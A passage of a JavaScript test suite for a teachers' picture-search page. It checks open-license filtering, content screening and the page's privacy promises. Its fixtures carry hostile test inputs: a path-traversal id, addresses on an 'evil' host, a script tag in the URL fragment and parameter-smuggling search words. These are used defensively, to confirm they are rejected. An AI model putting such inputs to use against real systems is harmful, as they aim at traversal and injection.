  gsRow(3, 'cat', gsSet('Sclera Symbols', 'by-nc'), '3.png'),
  gsRow(4, 'cat', gsSet('SEA Symbols', 'by-nc-nd'), '4.png'),
  gsRow(5, 'Cat', gsSet('Mulberry Symbols', 'by-sa', { publisher: 'Steve Lee', slug: 'mulberry' })),
  gsRow(6, 'cat', gsSet('OCHA Humanitarian Icons', null), '6.png'),
  gsRow(7, 'cat', gsSet('PiCom AI Realistic Symbols', 'by-sa'), '7.png'),
  gsRow(8, 'cat', null, '8.png'),                                              // no symbol set, so no stated license
  gsRow(9, 'cat', gsSet('Mulberry Symbols', 'by-sa'), '9.svg', 'cdn.example.org'),   // a picture on a host the page may not reach
  gsRow(10, 'cat', { ...gsSet('Unlabeled', 'by-sa'), licence: null }, '10.png'),
  gsRow(11, 'cat', { ...gsSet('Odd', 'by-sa'), licence: { name: 'Creative Commons BY NC 4.0', properties: 'by', version: '4.0', url: null } }, '11.png'),   // the name and the code disagree: left out
];
const ovRow = (n, license, extra = {}) => ({ id: '00000000-0000-4000-8000-' + String(n).padStart(12, '0'), title: 'Cat ' + n, creator: 'Maker ' + n, creator_url: 'https://example.org/u/' + n,
  foreign_landing_url: 'https://www.flickr.com/photos/x/' + n, url: 'https://live.staticflickr.com/' + n + '.jpg', license, license_version: license === 'cc0' || license === 'pdm' ? '1.0' : '2.0',
  license_url: license ? 'https://creativecommons.org/' + (license === 'cc0' ? 'publicdomain/zero/1.0/' : license === 'pdm' ? 'publicdomain/mark/1.0/' : 'licenses/' + license + '/2.0/') : null,
  provider: 'flickr', source: 'flickr', tags: [{ name: 'cat' }], mature: false, unstable__sensitivity: [], thumbnail: 'https://api.openverse.org/v1/images/x/thumb/', ...extra });
const OV_JSON = { result_count: 11, page_count: 1, page_size: 20, page: 1, results: [
  ovRow(1, 'by'), ovRow(2, 'by-nc'), ovRow(3, 'by-nd'), ovRow(4, 'cc0'), ovRow(5, 'pdm'),
  ovRow(6, 'by-sa', { mature: true }), ovRow(7, 'by', { unstable__sensitivity: ['sensitive_text'] }), ovRow(8, 'by', { title: 'Nude with cat' }),
  ovRow(9, 'by', { tags: [{ name: 'cat' }, { name: 'ai-generated' }] }), ovRow(10, null), ovRow(11, 'by-sa', { creator: null, license_version: '4.0', license_url: null }),
  ovRow(12, 'by-nc-sa'), ovRow(13, 'by-nc-nd'), ovRow(14, 'by', { mature: undefined }), { ...ovRow(15, 'by'), id: '../../evil' },
] };
const wmPage = (n, short, extra = {}, meta = {}) => ({ pageid: 100 + n, ns: 6, title: 'File:Cat_number ' + n + '.jpg', index: n, imageinfo: [{ mime: 'image/jpeg',
  thumburl: 'https://thumb.wikimedia.org/wikipedia/commons/thumb/a/a' + n + '/Cat_' + n + '.jpg/330px-Cat_' + n + '.jpg?utm_source=commons.wikimedia.org&utm_campaign=imageinfo&utm_content=thumbnail',
  descriptionurl: 'https://commons.wikimedia.org/wiki/File:Cat_' + n + '.jpg',
  extmetadata: { ...(short ? { LicenseShortName: { value: short } } : {}), Artist: { value: '<a href="//commons.wikimedia.org/wiki/User:Ada" title="User:Ada">Ada &amp; Bo</a>' }, Categories: { value: 'Cats|Pets' }, ...meta }, ...extra }] });
const WM_JSON = { batchcomplete: true, query: { pages: [
  wmPage(3, 'Public domain'),
  wmPage(1, 'CC BY-SA 4.0', {}, { LicenseUrl: { value: 'https://creativecommons.org/licenses/by-sa/4.0' }, License: { value: 'cc-by-sa-4.0' } }),
  wmPage(2, 'CC BY-NC 2.0'), wmPage(4, 'GFDL'), wmPage(5, ''), wmPage(6, 'CC BY 4.0', { mime: 'image/gif' }),
  wmPage(7, 'CC BY 4.0', {}, { Categories: { value: 'Cats|Nude photography' } }),
  wmPage(8, 'CC BY 4.0', { thumburl: 'https://evil.example.org/330px-Cat.jpg' }),
  wmPage(9, 'CC0', {}, { LicenseUrl: { value: 'http://creativecommons.org/publicdomain/zero/1.0/deed.en' }, Attribution: { value: 'Photo: Cy' } }),
  wmPage(10, 'CC BY 4.0', {}, { Categories: { value: 'AI-generated images of cats' } }),
  wmPage(11, 'CC BY-SA 3.0', {}, { License: { value: 'cc-by-nc-sa-3.0' } }),          // the name and the code disagree: left out
  wmPage(12, 'CC BY-ND 4.0'), wmPage(13, 'Attribution'), wmPage(14, 'No restrictions'),
] } };

describe('which pictures may be shown', () => {
  it('reads a license from a code or a name: public domain, CC0, CC BY and CC BY-SA only', () => {
    const open = { by: 'CC BY', 'by-sa': 'CC BY-SA', cc0: 'CC0', pdm: 'Public domain', 'CC BY 4.0': 'CC BY 4.0', 'CC BY-SA 3.0': 'CC BY-SA 3.0', 'CC BY 2.0 fr': 'CC BY 2.0 fr', 'cc-by-sa-4.0': 'CC BY-SA 4.0',
      'Creative Commons BY SA 4.0': 'CC BY-SA 4.0', CC0: 'CC0', 'cc-zero': 'CC0', 'Public domain': 'Public domain', 'Public Domain': 'Public domain', pd: 'Public domain', 'PD-old-100': 'Public domain' };
    for (const [given, label] of Object.entries(open)) expect(pictures.openLicense(given)?.label, given).toBe(label);
    const closed = ['by-nc', 'by-nd', 'by-nc-sa', 'by-nc-nd', 'CC BY-NC 4.0', 'CC BY-ND 4.0', 'CC BY-NC-SA 4.0', 'CC BY-NC-ND 4.0', 'cc-by-nc-sa-3.0', 'Creative Commons BY NC SA 4.0', 'Creative Commons BY NC 4.0',
      'Creative Commons BY NC ND 4.0', 'Attribution-NonCommercial', 'Attribution-NoDerivs', 'GFDL', 'Attribution', 'FAL', 'No restrictions', 'sampling+', 'nc-sampling+', 'All rights reserved', 'Copyrighted',
      'by-anything-else', 'bypass', 'cc', '', null, undefined, 7, {}, ['by']];
    for (const given of closed) expect(pictures.openLicense(given), String(given)).toBeNull();
    expect(pictures.openLicense('by', '2.0')).toEqual({ label: 'CC BY 2.0', url: 'https://creativecommons.org/licenses/by/2.0/' });
    expect(pictures.openLicense('by-sa', '4.0', 'https://creativecommons.org/licenses/by-sa/4.0/')).toEqual({ label: 'CC BY-SA 4.0', url: 'https://creativecommons.org/licenses/by-sa/4.0/' });
    // A license address is taken only from creativecommons.org, and only for the same license.
    expect(pictures.openLicense('by', '2.0', 'https://evil.example.org/licenses/by/2.0/').url).toBe('https://creativecommons.org/licenses/by/2.0/');
    expect(pictures.openLicense('by', '2.0', 'https://creativecommons.org/licenses/by-nc/2.0/').url).toBe('https://creativecommons.org/licenses/by/2.0/');
    expect(pictures.openLicense('cc0', '', 'http://creativecommons.org/publicdomain/zero/1.0/deed.en').url).toBe('https://creativecommons.org/publicdomain/zero/1.0/');
  });

  it('Global Symbols: only symbol sets with an open license, never a set made by a model, the exact word first', () => {
    const found = pictures.fromGlobalSymbols(GS_ROWS, 'cat');
    expect(found.pictures.map((picture) => [picture.title, picture.license, picture.source])).toEqual([
      ['Cat', 'CC BY-SA 4.0', 'Mulberry Symbols, on Global Symbols'], ['cat', 'Public domain', 'OCHA Humanitarian Icons, on Global Symbols'], ['Cat Bed', 'CC BY-SA 4.0', 'OpenMoji, on Global Symbols']]);
    expect(found.pictures[0]).toEqual({ key: 'globalsymbols:1005', service: 'globalsymbols', title: 'Cat', author: 'Steve Lee', license: 'CC BY-SA 4.0', licenseUrl: 'https://creativecommons.org/licenses/by-sa/4.0/',
      source: 'Mulberry Symbols, on Global Symbols', sourceUrl: 'https://globalsymbols.com/symbolsets/mulberry', show: 'https://globalsymbols.com/uploads/production/image/imagefile/5/5.svg' });
    expect(found.leftOut).toBe(7);
    for (const junk of [null, undefined, 'x', {}, [null, 7, {}, { picto: {} }]]) expect(pictures.fromGlobalSymbols(junk, 'cat').pictures).toEqual([]);
    // One large set does not fill the group: three from a set, then the others.
    const many = [...Array.from({ length: 9 }, (_, i) => gsRow(20 + i, 'cat', gsSet('OpenMoji', 'by-sa'))), gsRow(40, 'cat', gsSet('Mulberry Symbols', 'by-sa')), gsRow(41, 'cat', gsSet('Tawasol', 'by-sa'))];
    const mixed = pictures.fromGlobalSymbols(many, 'cat').pictures;
    expect(mixed.length).toBe(pictures.MOST);
    expect(mixed.slice(0, 5).map((picture) => picture.source.split(',')[0])).toEqual(['OpenMoji', 'OpenMoji', 'OpenMoji', 'Mulberry Symbols', 'Tawasol']);
  });

  it('Openverse: open licenses only, and only results the service marks as not mature with no sensitivity note', () => {
    const found = pictures.fromOpenverse(OV_JSON);
    expect(found.pictures.map((picture) => [picture.title, picture.license])).toEqual([['Cat 1', 'CC BY 2.0'], ['Cat 4', 'CC0'], ['Cat 5', 'Public domain'], ['Cat 11', 'CC BY-SA 4.0']]);
    expect(found.pictures[0]).toEqual({ key: 'openverse:00000000-0000-4000-8000-000000000001', service: 'openverse', title: 'Cat 1', author: 'Maker 1', license: 'CC BY 2.0', licenseUrl: 'https://creativecommons.org/licenses/by/2.0/',
      source: 'Openverse', sourceUrl: 'https://www.flickr.com/photos/x/1', show: 'https://api.openverse.org/v1/images/00000000-0000-4000-8000-000000000001/thumb/' });
    expect(found.pictures[3].author).toBe('');
    expect(found.pictures[3].licenseUrl).toBe('https://creativecommons.org/licenses/by-sa/4.0/');
    expect(found.leftOut).toBe(10);
    // The picture is asked for from the service's own host, never from the site a result names.
    for (const picture of found.pictures) expect(new URL(picture.show).hostname).toBe('api.openverse.org');
    for (const junk of [null, undefined, 'x', [], { results: 'x' }, { results: [null, 7, {}] }]) expect(pictures.fromOpenverse(junk).pictures).toEqual([]);
    // The search itself asks for those licenses only, and for no mature results.
    const asked = new URL(pictures.searchAddress('openverse', 'cat'));
    expect(asked.searchParams.get('license')).toBe('cc0,pdm,by,by-sa');
    expect(asked.searchParams.get('mature')).toBe('false');
    expect([...asked.searchParams.keys()].sort()).toEqual(['license', 'mature', 'page_size', 'q']);
  });

  it('Wikimedia Commons: open licenses only, still pictures only, in the order of the search, with the author as plain text', () => {
    const found = pictures.fromCommons(WM_JSON);
    expect(found.pictures.map((picture) => [picture.title, picture.license, picture.author])).toEqual([['Cat number 1', 'CC BY-SA 4.0', 'Ada & Bo'], ['Cat number 3', 'Public domain', 'Ada & Bo'], ['Cat number 9', 'CC0', 'Photo: Cy']]);
    expect(found.pictures[0]).toEqual({ key: 'commons:101', service: 'commons', title: 'Cat number 1', author: 'Ada & Bo', license: 'CC BY-SA 4.0', licenseUrl: 'https://creativecommons.org/licenses/by-sa/4.0',
      source: 'Wikimedia Commons', sourceUrl: 'https://commons.wikimedia.org/wiki/File:Cat_1.jpg', show: 'https://thumb.wikimedia.org/wikipedia/commons/thumb/a/a1/Cat_1.jpg/330px-Cat_1.jpg' });
    expect(found.pictures[2].licenseUrl).toBe('https://creativecommons.org/publicdomain/zero/1.0/');
    expect(found.leftOut).toBe(10);
    for (const picture of found.pictures) expect(picture.show).not.toContain('?');
    // The older form of the answer, keyed by page id, reads the same.
    const keyed = { query: { pages: Object.fromEntries(WM_JSON.query.pages.map((one) => [one.pageid, one])) } };
    expect(pictures.fromCommons(keyed)).toEqual(found);
    for (const junk of [null, undefined, 'x', {}, { query: {} }, { query: { pages: [null, 7, {}, { imageinfo: [] }] } }]) expect(pictures.fromCommons(junk).pictures).toEqual([]);
  });

  it('a search address holds the word and nothing else of the teacher\'s, and only a plain word is ever sent', () => {
    const fixed = {
      globalsymbols: 'https://globalsymbols.com/api/v1/labels/search?query=WORD&language=eng&language_iso_format=639-3&limit=100&expand=picto.symbolset',
      openverse: 'https://api.openverse.org/v1/images/?q=WORD&license=cc0,pdm,by,by-sa&mature=false&page_size=20',
      commons: 'https://commons.wikimedia.org/w/api.php?action=query&format=json&formatversion=2&origin=*&generator=search&gsrsearch=WORD%20filetype%3Abitmap&gsrnamespace=6&gsrlimit=20'
        + '&prop=imageinfo&iiprop=url%7Cmime%7Cextmetadata&iiurlwidth=330&iiextmetadatafilter=LicenseShortName%7CLicense%7CLicenseUrl%7CArtist%7CAttribution%7CImageDescription%7CCategories',
    };
    for (const [service, address] of Object.entries(fixed)) {
      expect(pictures.searchAddress(service, 'cat')).toBe(address.replace('WORD', 'cat'));
      for (const bad of ['', 'a', 'Cat', 'cat&x=1', 'ice cream', 'cat/../x', 'x'.repeat(25), null, undefined]) expect(pictures.searchAddress(service, bad), service + ' ' + bad).toBe('');
    }
    expect(pictures.searchAddress('elsewhere', 'cat')).toBe('');
  });
});

// ---------------------------------------------------------------------------------------------------------------
// The page, run: a jsdom window with the real page and scripts, a stand-in fetch, database and canvas
// ---------------------------------------------------------------------------------------------------------------
const PICTURE_BYTES = { 'image/jpeg': new Uint8Array(3000).fill(9), 'image/svg+xml': PLAIN_SVG };
function network(overrides = {}) {
  return (address, options, window) => {
    const url = new URL(address);
    const answer = (status, body) => Promise.resolve({ ok: status >= 200 && status < 300, status, json: async () => body,
      blob: async () => new window.Blob([PICTURE_BYTES[body] || 'x'], { type: body }) });
    const key = url.pathname.includes('/api/v1/labels/search') ? 'globalsymbols' : url.hostname === 'commons.wikimedia.org' ? 'commons' : url.pathname === '/v1/images/' ? 'openverse' : 'picture';
    if (overrides[key]) return overrides[key](answer, address);
    if (key === 'globalsymbols') return answer(200, GS_ROWS);
    if (key === 'openverse') return answer(200, OV_JSON);
    if (key === 'commons') return answer(200, WM_JSON);
    return answer(200, /\.svg$/.test(url.pathname) ? 'image/svg+xml' : 'image/jpeg');
  };
}
async function openPage({ hash = '', idb = fakeIndexedDB(), fetchImpl = network(), online = true, kept = false, canvas = { bitmap: { width: 330, height: 220 } } } = {}) {
  const { window } = new JSDOM(read(PAGE), { runScripts: 'outside-only', url: 'https://packets.test/packets-pictures.html' + hash, pretendToBeVisual: true });
  const calls = [];
  window.fetch = (address, options) => { calls.push({ address: String(address), options }); return fetchImpl(String(address), options, window); };
  if (idb) Object.defineProperty(window, 'indexedDB', { value: idb, configurable: true });
  Object.defineProperty(window.navigator, 'onLine', { get: () => online, configurable: true });
  if (kept) window.localStorage.setItem('alloflow-packets-pictures/1', JSON.stringify({ online: true }));
  const log = standInCanvas(window, canvas);
  for (const file of ['packets-page.js', STORE, SCRIPT]) window.eval(read(file));
  const doc = window.document;
  const $ = (id) => doc.getElementById(id);
  const shown = (id) => !$(id).hidden;
  await until(() => !idb || $('mine-line').textContent !== '' && window.AlloPacketMyWords, 'the page started');
  await tick(); await tick();
  const type = (word) => { $('word').value = word; $('word').dispatchEvent(new window.Event('input', { bubbles: true })); };
  const turn = (id, on) => { $(id).checked = on; $(id).dispatchEvent(new window.Event('change', { bubbles: true })); };
  const cards = (service) => [...$('pics-' + service).querySelectorAll('li')];
  const searched = async () => { $('search').click(); await until(() => $('search').textContent === 'Search' && !$('search').hasAttribute('aria-disabled'), 'the search ended'); await tick(); };
  return { window, doc, $, shown, calls, log, type, turn, cards, searched, store: window.AlloPacketMyWords, said: () => $('said').textContent };
}

describe('the page, run: nothing is sent uninvited', () => {
  it('opens with the word from the address, the switch off, and has asked for nothing', async () => {
    const view = await openPage({ hash: '#word=Cat' });
    expect(view.$('word').value).toBe('cat');
    expect(view.$('online-on').checked).toBe(false);
    expect(view.shown('online-more')).toBe(false);
    expect(view.shown('results')).toBe(false);
    expect(view.shown('saved')).toBe(false);
    expect(view.shown('not-keeping')).toBe(false);
    expect(view.$('mine-line').textContent).toBe('No pictures yet.');
    expect(view.calls).toEqual([]);
    expect(view.window.localStorage.length).toBe(0);
    expect([...view.doc.querySelectorAll('img')].filter((image) => image.getAttribute('src')).length).toBe(0);
    // Nothing in the page can start a search while the switch is off: not the button, not the Enter key.
    view.$('search').click();
    view.$('word').dispatchEvent(new view.window.KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
    view.type('sun');
    await tick(); await tick();
    expect(view.calls).toEqual([]);
    expect(view.shown('results')).toBe(false);
  });

  it('a word in the address that is not a plain word is not used', async () => {
    for (const hash of ['#word=ice%20cream', '#word=%3Cscript%3E', '#word=%E0%A4%A', '#word=', '#other=cat', '#word=a', '']) {
      const view = await openPage({ hash });
      expect(view.$('word').value, hash).toBe('');
      expect(view.calls, hash).toEqual([]);
    }
  });

  it('turning the switch on sends nothing; Search then asks the three services for the word, without cookies or a referrer', async () => {
    const view = await openPage({ hash: '#word=cat' });
    view.turn('online-on', true);
    await tick();
    expect(view.shown('online-more')).toBe(true);
    expect(view.said()).toBe('On. Nothing is sent until you press Search.');
    expect(view.calls).toEqual([]);
    // Not remembered unless the teacher asks.
    expect(view.window.localStorage.length).toBe(0);
    await view.searched();
    expect(view.calls.map((call) => call.address)).toEqual(['globalsymbols', 'openverse', 'commons'].map((service) => pictures.searchAddress(service, 'cat')));
    for (const call of view.calls) {
      expect(SEARCH_HOSTS).toContain(new URL(call.address).hostname);
      expect({ ...call.options, signal: undefined }).toEqual({ method: 'GET', mode: 'cors', credentials: 'omit', referrerPolicy: 'no-referrer', signal: undefined });
      expect(call.options.signal).toBeTruthy();
      expect(call.address.match(/cat/g)).toEqual(['cat']);
    }
    expect(view.shown('results')).toBe(true);
    expect(view.$('results-title').textContent).toBe('Pictures for the word cat');
    expect(view.doc.activeElement).toBe(view.$('results-title'));
    expect(view.said()).toBe('Global Symbols: 3 pictures. Openverse: 4 pictures. Wikimedia Commons: 3 pictures.');
  });

  it('shows only pictures with an open license, each with its author and license and one named button', async () => {
    const view = await openPage({ hash: '#word=cat' });
    view.turn('online-on', true);
    await view.searched();
    const read3 = (service) => view.cards(service).map((card) => [...card.querySelectorAll('p')].map((p) => p.textContent));
    expect(read3('globalsymbols')).toEqual([['Cat', 'by Steve Lee', 'CC BY-SA 4.0'], ['cat', 'by OCHA Humanitarian Icons team', 'Public domain'], ['Cat Bed', 'by OpenMoji team', 'CC BY-SA 4.0']]);
    expect(read3('openverse')).toEqual([['Cat 1', 'by Maker 1', 'CC BY 2.0'], ['Cat 4', 'by Maker 4', 'CC0'], ['Cat 5', 'by Maker 5', 'Public domain'], ['Cat 11', 'Author not named', 'CC BY-SA 4.0']]);
    expect(read3('commons')).toEqual([['Cat number 1', 'by Ada & Bo', 'CC BY-SA 4.0'], ['Cat number 3', 'by Ada & Bo', 'Public domain'], ['Cat number 9', 'by Photo: Cy', 'CC0']]);
    expect(view.$('said-globalsymbols').textContent).toBe('3 pictures.');
    expect(view.$('said-openverse').textContent).toBe('4 pictures.');
    const text = view.$('results').textContent;
    expect(text).not.toMatch(/NC|ND|NonCommercial|GFDL|Nude|ARASAAC|Sclera|Realistic/);
    const allCards = view.doc.querySelectorAll('#results li.pic');
    expect(allCards.length).toBe(10);
    for (const card of allCards) {
      expect(card.parentNode.tagName).toBe('UL');
      const button = card.querySelector('button');
      expect(button.type).toBe('button');
      expect(button.textContent).toBe('Use this picture');
      expect(button.getAttribute('aria-label')).toBe('Use this picture: ' + card.querySelector('.pic-title').textContent + ', ' + card.querySelector('.pic-by').textContent + ', ' + card.querySelector('.pic-license').textContent);
      // Every picture comes from a host the rule names, and is asked for without cookies.
      const image = card.querySelector('img');
      expect(PICTURE_HOSTS).toContain(new URL(image.src).hostname);
      expect(new URL(image.src).protocol).toBe('https:');
      expect(image.crossOrigin).toBe('anonymous');
      expect(image.getAttribute('alt')).toBe('');
    }
    expect(view.cards('globalsymbols')[0].querySelector('button').getAttribute('aria-label')).toBe('Use this picture: Cat, by Steve Lee, CC BY-SA 4.0');
    // Nothing a service sent became markup: the author's link arrived as plain text.
    expect(view.$('results').querySelectorAll('a, script, b').length).toBe(0);
    // A picture that does not arrive cannot be looked at, so its card goes.
    view.cards('openverse')[1].querySelector('img').dispatchEvent(new view.window.Event('error'));
    expect(view.cards('openverse').length).toBe(3);
    // Still exactly three requests: showing results asked for nothing more through fetch.
    expect(view.calls.length).toBe(3);
  });

  it('"Use this picture" copies it, makes it small and saves it for the word with its credit', async () => {
    const idb = fakeIndexedDB();
    const view = await openPage({ hash: '#word=cat', idb });
    view.turn('online-on', true);
    await view.searched();
    view.cards('commons')[0].querySelector('button').click();
    await until(() => view.shown('saved'), 'the picture was saved');
    // One more request: the picture itself, from a host that serves pictures, asked for like the search.
    expect(view.calls.length).toBe(4);
    expect(view.calls[3].address).toBe('https://thumb.wikimedia.org/wikipedia/commons/thumb/a/a1/Cat_1.jpg/330px-Cat_1.jpg');
    expect(view.calls[3].options).toMatchObject({ method: 'GET', mode: 'cors', credentials: 'omit', referrerPolicy: 'no-referrer' });
    // Made small: 330 x 220 became 256 x 171.
    expect(view.log.made).toEqual([{ type: 'image/jpeg', quality: 0.85, width: 256, height: 171, white: true }]);
    const entry = await view.store.get('cat');
    expect(entry.picture.dataUri.startsWith('data:image/jpeg;base64,')).toBe(true);
    expect(entry.picture.credit).toEqual({ title: 'Cat number 1', author: 'Ada & Bo', license: 'CC BY-SA 4.0', licenseUrl: 'https://creativecommons.org/licenses/by-sa/4.0',
      source: 'Wikimedia Commons', sourceUrl: 'https://commons.wikimedia.org/wiki/File:Cat_1.jpg', resized: true });
    expect(idb.peek('rows')).toMatchObject([{ word: 'cat', picture: true, own: false }]);
    // The page says so, in the words of the plan, and offers the way back.
    expect(view.$('saved-line').textContent).toBe('Saved for the word cat. It is on this device only.');
    expect(view.$('saved-credit').textContent).toBe('"Cat number 1" by Ada & Bo, CC BY-SA 4.0 (creativecommons.org/licenses/by-sa/4.0), from Wikimedia Commons (commons.wikimedia.org/wiki/File:Cat_1.jpg), made smaller.');
    expect(view.$('saved-picture').src).toBe(entry.picture.dataUri);
    expect(view.doc.activeElement).toBe(view.$('saved-title'));
    expect(view.$('saved').querySelector('a').getAttribute('href')).toBe('packets-make.html');
    // "My pictures" lists it.
    await until(() => view.$('mine-list').children.length === 1, 'my pictures was drawn');
    expect(view.$('mine-line').textContent).toBe('1 word has a picture. They are kept in this browser, on this device.');
    expect(view.$('mine-list').querySelector('.mine-word').textContent).toBe('cat');
    expect(view.$('mine-list').querySelector('.mine-credit').textContent).toContain('"Cat number 1" by Ada & Bo, CC BY-SA 4.0');
    expect(view.$('mine-list').querySelector('button').getAttribute('aria-label')).toBe('Remove the picture for cat');
    expect(view.shown('remove-all')).toBe(false);
    // A symbol that is a plain SVG drawing is kept as the drawing, and is not said to be changed.
    view.cards('globalsymbols')[0].querySelector('button').click();
    await until(() => view.$('saved-credit').textContent.includes('Mulberry'), 'the symbol was saved');
    const symbol = await view.store.get('cat');
    expect(symbol.picture.dataUri).toBe(svgUri(PLAIN_SVG));
    expect(symbol.picture.credit).toEqual({ title: 'Cat', author: 'Steve Lee', license: 'CC BY-SA 4.0', licenseUrl: 'https://creativecommons.org/licenses/by-sa/4.0/',
      source: 'Mulberry Symbols, on Global Symbols', sourceUrl: 'https://globalsymbols.com/symbolsets/mulberry' });
    expect(view.calls[4].address).toBe('https://globalsymbols.com/uploads/production/image/imagefile/5/5.svg');
    expect(view.calls.length).toBe(5);
    for (const call of view.calls) expect(ALL_HOSTS).toContain(new URL(call.address).hostname);
  });

  it('a picture from the device is read in the browser, saved as the teacher\'s own, and asks the network for nothing', async () => {
    const view = await openPage({ hash: '#word=sun', canvas: { bitmap: { width: 1200, height: 900 } } });
    const file = new view.window.File([new Uint8Array(4000)], 'sun.jpg', { type: 'image/jpeg' });
    Object.defineProperty(view.$('file'), 'files', { value: [file], configurable: true });
    view.$('file').dispatchEvent(new view.window.Event('change', { bubbles: true }));
    await until(() => view.shown('saved'), 'the file was saved');
    expect(view.calls).toEqual([]);
    const entry = await view.store.get('sun');
    expect(entry.picture.credit).toEqual({ own: true });
    expect([view.log.made[0].width, view.log.made[0].height]).toEqual([256, 192]);
    expect(view.$('saved-line').textContent).toBe('Saved for the word sun. It is on this device only.');
    expect(view.$('saved-credit').textContent).toBe("The teacher's own picture.");
    // With no word, the page asks for one first and opens no file box.
    const empty = await openPage({});
    let opened = 0;
    empty.$('file').click = () => { opened++; };
    empty.$('choose').click();
    expect(opened).toBe(0);
    expect(empty.$('device-said').textContent).toBe('Type a word first: one word, 2 to 24 letters.');
    expect(empty.doc.activeElement).toBe(empty.$('word'));
    empty.type('Sun');
    empty.$('choose').click();
    expect(opened).toBe(1);
    // A file that is not a picture gets a plain reason, and nothing is saved.
    const wrong = await openPage({ hash: '#word=sun' });
    Object.defineProperty(wrong.$('file'), 'files', { value: [new wrong.window.File(['notes'], 'notes.txt', { type: 'text/plain' })], configurable: true });
    wrong.$('file').dispatchEvent(new wrong.window.Event('change', { bubbles: true }));
    await until(() => wrong.$('device-said').textContent === 'That file is not a picture.', 'the reason was shown');
    expect(wrong.said()).toBe('That file is not a picture.');
    expect(await wrong.store.get('sun')).toBeNull();
  });

  it('"Keep this on, on this device" is the only thing that remembers the switch, and a remembered switch still sends nothing on its own', async () => {
    const view = await openPage({ hash: '#word=cat' });
    view.turn('online-on', true);
    view.turn('online-keep', true);
    expect(view.window.localStorage.length).toBe(1);
    expect(view.window.localStorage.getItem('alloflow-packets-pictures/1')).toBe('{"online":true}');
    // The page opened again on this device: the switch is on, and nothing has been asked for.
    const again = await openPage({ hash: '#word=cat', kept: true });
    expect(again.$('online-on').checked).toBe(true);
    expect(again.$('online-keep').checked).toBe(true);
    expect(again.shown('online-more')).toBe(true);
    await tick(); await tick();
    expect(again.calls).toEqual([]);
    expect(again.shown('results')).toBe(false);
    // Unchecking it, or turning the switch off, forgets.
    again.turn('online-keep', false);
    expect(again.window.localStorage.length).toBe(0);
    again.turn('online-keep', true);
    again.turn('online-on', false);
    expect(again.window.localStorage.length).toBe(0);
    expect(again.$('online-keep').checked).toBe(false);
    expect(again.shown('online-more')).toBe(false);
    expect(again.said()).toBe('Off. This page sends nothing.');
    // A stored value that is not the page's own does not turn the switch on.
    for (const junk of ['true', '{"online":"yes"}', 'not json', '[]']) {
      const fresh = new JSDOM(read(PAGE), { runScripts: 'outside-only', url: 'https://packets.test/packets-pictures.html' }).window;
      fresh.localStorage.setItem('alloflow-packets-pictures/1', junk);
      Object.defineProperty(fresh, 'indexedDB', { value: fakeIndexedDB() });
      for (const file of [STORE, SCRIPT]) fresh.eval(read(file));
      expect(fresh.document.getElementById('online-on').checked, junk).toBe(false);
    }
  });

  it('says in plain words when a search cannot be done: offline, a service not answering, too many searches, no results', async () => {
    const offline = await openPage({ hash: '#word=cat', online: false });
    offline.turn('online-on', true);
    offline.$('search').click();
    await tick();
    expect(offline.calls).toEqual([]);
    expect(offline.$('online-said').textContent).toBe('This device is offline. Connect to the internet, then search again.');
    expect(offline.said()).toBe('This device is offline. Connect to the internet, then search again.');
    expect(offline.shown('results')).toBe(false);

    const rough = await openPage({ hash: '#word=cat', fetchImpl: network({
      globalsymbols: () => Promise.reject(new TypeError('Failed to fetch')),
      openverse: (answer) => answer(429, { detail: 'Request was throttled.' }),
      commons: (answer) => answer(200, { batchcomplete: true }),
    }) });
    rough.turn('online-on', true);
    await rough.searched();
    expect(rough.$('said-globalsymbols').textContent).toBe('Global Symbols is not answering right now. Search again in a moment.');
    expect(rough.$('said-openverse').textContent).toBe('Openverse has had too many searches from this network for now. Try again later.');
    expect(rough.$('said-commons').textContent).toBe('No pictures with an open license were found here for this word.');
    expect(rough.said()).toBe('Global Symbols: not answering. Openverse: too many searches for now. Wikimedia Commons: no pictures.');
    expect(rough.doc.querySelectorAll('#results li').length).toBe(0);
    // One service failing does not hide the others.
    const partial = await openPage({ hash: '#word=cat', fetchImpl: network({ openverse: (answer) => answer(504, 'error code: 504'), globalsymbols: () => Promise.resolve({ ok: true, status: 200, json: async () => { throw new SyntaxError('not JSON'); } }) }) });
    partial.turn('online-on', true);
    await partial.searched();
    expect(partial.cards('commons').length).toBe(3);
    expect(partial.$('said-openverse').textContent).toBe('Openverse is not answering right now. Search again in a moment.');
    expect(partial.$('said-globalsymbols').textContent).toBe('Global Symbols is not answering right now. Search again in a moment.');
    // With no word, Search asks for one and sends nothing.
    const wordless = await openPage({});
    wordless.turn('online-on', true);
    wordless.$('search').click();
    await tick();
    expect(wordless.calls).toEqual([]);
    expect(wordless.$('online-said').textContent).toBe('Type a word first: one word, 2 to 24 letters.');
    expect(wordless.doc.activeElement).toBe(wordless.$('word'));
  });

  it('a picture that cannot be copied is not saved, and the page says so', async () => {
    const cases = {
      'the picture does not arrive': { fetchImpl: network({ picture: (answer) => answer(404, 'image/jpeg') }) },
      'the request fails': { fetchImpl: network({ picture: () => Promise.reject(new TypeError('Failed to fetch')) }) },
      'the browser cannot read it': { canvas: { bitmap: undefined, image: null } },
    };
    for (const [what, options] of Object.entries(cases)) {
      const view = await openPage({ hash: '#word=cat', ...options });
      view.turn('online-on', true);
      await view.searched();
      const button = view.cards('openverse')[0].querySelector('button');
      button.click();
      await until(() => view.$('said-openverse').textContent !== '4 pictures.', what);
      expect(view.$('said-openverse').textContent, what).toMatch(what === 'the browser cannot read it' ? /^That file is not a picture this browser can read\.$/ : /^This picture could not be copied\. Choose another one\.$/);
      expect(view.said(), what).toBe(view.$('said-openverse').textContent);
      expect(await view.store.get('cat'), what).toBeNull();
      expect(view.shown('saved'), what).toBe(false);
      // The button works again.
      expect(button.hasAttribute('aria-disabled'), what).toBe(false);
    }
    // The site a picture is on does not let a page copy it: the store's own words are shown.
    const tainted = await openPage({ hash: '#word=cat', canvas: { bitmap: { width: 300, height: 300 }, tainted: true } });
    tainted.turn('online-on', true);
    await tainted.searched();
    tainted.cards('commons')[0].querySelector('button').click();
    await until(() => tainted.$('said-commons').textContent !== '3 pictures.', 'the reason was shown');
    expect(tainted.$('said-commons').textContent).toBe('This picture cannot be copied: the site it comes from does not allow it.');
    expect(await tainted.store.get('cat')).toBeNull();
  });

  it('pictures found for one word are put away when the word changes, and are saved under the word they were found for', async () => {
    const view = await openPage({ hash: '#word=cat' });
    view.turn('online-on', true);
    await view.searched();
    expect(view.shown('results')).toBe(true);
    view.type('cat');                      // the same word: nothing changes
    expect(view.shown('results')).toBe(true);
    view.type('cats');
    expect(view.shown('results')).toBe(false);
    view.type('cat');
